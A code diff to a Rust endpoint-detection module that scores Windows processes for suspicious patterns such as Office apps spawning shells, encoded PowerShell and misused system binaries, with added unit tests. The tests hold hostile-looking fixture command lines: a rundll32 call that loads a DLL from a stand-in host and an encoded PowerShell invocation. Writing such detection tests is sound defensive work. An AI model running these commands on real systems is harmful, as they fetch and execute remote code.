@@ -8,6 +8,9 @@ use cairn_core::record::ProcessRecord;
 
 // --- Named rule tables (config-loader seam; see spec) -------------------------
 
+// NOTE: these tables match on the lowercased file NAME only. A renamed binary evades
+// them; hash/signer-based enrichment is a future signal (the is_suspicious_path signal
+// gives partial path-based coverage in the meantime).
 /// Parent images whose spawning of a shell is anomalous (Office apps).
 pub(crate) const OFFICE_PARENTS: &[&str] =
     &["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe"];
@@ -48,9 +51,9 @@ pub(crate) fn file_name(image: &str) -> String {
 /// `-e ` only counts when the image is a PowerShell binary (avoids unrelated -e flags).
 pub(crate) fn has_encoded_powershell(image_name: &str, cmdline: &str) -> bool {
     let lc = cmdline.to_ascii_lowercase();
-    let flag = lc.contains("-enc")
-        || lc.contains("-encodedcommand")
-        || (lc.contains("-e ") && PS_BINARIES.contains(&image_name));
+    // `-enc` already subsumes `-encodedcommand` (substring); `-e ` is the short form,
+    // gated to PowerShell binaries so unrelated `-e ` flags on other tools don't match.
+    let flag = lc.contains("-enc") || (lc.contains("-e ") && PS_BINARIES.contains(&image_name));
     flag && has_base64_token(cmdline)
 }
 
@@ -84,6 +87,9 @@ pub(crate) fn score_process(p: &ProcessRecord, parent: Option<&ProcessRecord>) -
                 &["T1059"],
             );
         }
+        // Intentionally only the real shells (not other script hosts): a script host
+        // launching cmd/powershell is the suspicious pattern; wscript<->cscript chains
+        // are commonly benign.
         if SCRIPT_PARENTS.contains(&pn.as_str())
             && ["cmd.exe", "powershell.exe", "pwsh.exe"].contains(&child_name.as_str())
         {
@@ -177,5 +183,60 @@ mod tests {
         let s = score_process(&p, None);
         // suspicious path (25) + unsigned (20) = 45 -> at least medium, no panic
         assert!(s.weight >= 45);
+    }
+
+    /// A watchlisted LOLBAS binary with a suspicious http argument scores the LOLBAS
+    /// signal (+30, T1218); the same binary with a benign argument does not.
+    #[test]
+    fn lolbas_http_arg_fires_benign_does_not() {
+        let bad = proc(
+            300,
+            4,
+            r"C:\Windows\System32\rundll32.exe",
+            "rundll32.exe http://evil.example/x.dll,Entry",
+        );
+        let s = score_process(&bad, None);
+        assert!(s.mitre.contains(&"T1218".to_string()));
+        assert!(s.weight >= 30);
+
+        let benign = proc(
+            301,
+            4,
+            r"C:\Windows\System32\rundll32.exe",
+            "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+        );
+        let s2 = score_process(&benign, None);
+        assert!(
+            !s2.mitre.contains(&"T1218".to_string()),
+            "benign rundll32 must not fire the LOLBAS signal"
+        );
+    }
+
+    /// The `-e ` short form only counts for PowerShell binaries: a non-PS tool with
+    /// `-e <base64>` must NOT fire the encoded-PowerShell signal.
+    #[test]
+    fn dash_e_short_form_only_for_powershell() {
+        // non-PS binary with -e <base64-looking>: must NOT fire encoded-PS
+        let other = proc(
+            400,
+            4,
+            r"C:\tools\curl.exe",
+            "curl.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA https://x",
+        );
+        let s = score_process(&other, None);
+        assert!(
+            !s.mitre.contains(&"T1059.001".to_string()),
+            "-e on a non-PS binary must not be treated as encoded PowerShell"
+        );
+
+        // powershell with -e <base64>: DOES fire
+        let ps = proc(
+            401,
+            4,
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+        );
+        let s2 = score_process(&ps, None);
+        assert!(s2.mitre.contains(&"T1059.001".to_string()));
     }
 }
